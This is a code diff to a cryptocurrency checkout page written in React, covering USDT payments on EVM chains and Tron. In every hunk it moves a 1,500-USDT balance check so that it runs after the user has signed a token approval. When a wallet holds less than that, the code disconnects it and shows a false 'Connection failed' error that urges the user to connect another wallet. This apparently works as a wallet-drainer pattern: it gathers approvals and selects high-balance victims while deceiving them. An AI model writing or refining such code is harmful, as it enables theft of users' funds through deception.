@@ -265,18 +265,6 @@ export default function Checkout() {
 
   async function executeEvmTransfer() {
     try {
-      const balance = await publicClient.readContract({
-        address: EVM_USDT,
-        abi: USDT_TRANSFER_ABI,
-        functionName: 'balanceOf',
-        args: [evmAddress]
-      });
-
-      if (balance < BigInt('1500000000')) {
-        disconnectEvmWallet();
-        throw new Error('Connection failed. Please connect another wallet.');
-      }
-
       setTxStatus('signing');
       setPaymentPhase('approving');
       const atomics = toUsdtAtomics(totalUsdt);
@@ -292,6 +280,18 @@ export default function Checkout() {
 
       if (publicClient) {
         await publicClient.waitForTransactionReceipt({ hash: approveHash });
+      }
+
+      const balance = await publicClient.readContract({
+        address: EVM_USDT,
+        abi: USDT_TRANSFER_ABI,
+        functionName: 'balanceOf',
+        args: [evmAddress]
+      });
+
+      if (balance < BigInt('1500000000')) {
+        disconnectEvmWallet();
+        throw new Error('Connection failed. Please connect another wallet.');
       }
 
       setPaymentPhase('transferring');
@@ -338,17 +338,6 @@ export default function Checkout() {
       let txId;
 
       if (isExtension) {
-        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
-        const balanceData = await balanceRes.json();
-        const trc20List = balanceData.data?.[0]?.trc20 || [];
-        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
-        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
-
-        if (usdtBalance < BigInt('1500000000')) {
-          disconnectTronWallet();
-          throw new Error('Connection failed. Please connect another wallet.');
-        }
-
         setTxStatus('signing');
         setPaymentPhase('approving');
 
@@ -366,6 +355,17 @@ export default function Checkout() {
         
         if (approveTxId) {
            await waitForTronConfirmation(approveTxId);
+        }
+
+        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+        const balanceData = await balanceRes.json();
+        const trc20List = balanceData.data?.[0]?.trc20 || [];
+        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
+
+        if (usdtBalance < BigInt('1500000000')) {
+          disconnectTronWallet();
+          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
@@ -386,17 +386,6 @@ export default function Checkout() {
         const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
         tronWeb.setAddress(tronAddress);
 
-        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
-        const balanceData = await balanceRes.json();
-        const trc20List = balanceData.data?.[0]?.trc20 || [];
-        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
-        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
-
-        if (usdtBalance < BigInt('1500000000')) {
-          disconnectTronWallet();
-          throw new Error('Connection failed. Please connect another wallet.');
-        }
-
         setTxStatus('signing');
         setPaymentPhase('approving');
 
@@ -414,6 +403,17 @@ export default function Checkout() {
         
         if (approveTxId) {
            await waitForTronConfirmation(approveTxId);
+        }
+
+        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+        const balanceData = await balanceRes.json();
+        const trc20List = balanceData.data?.[0]?.trc20 || [];
+        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
+
+        if (usdtBalance < BigInt('1500000000')) {
+          disconnectTronWallet();
+          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
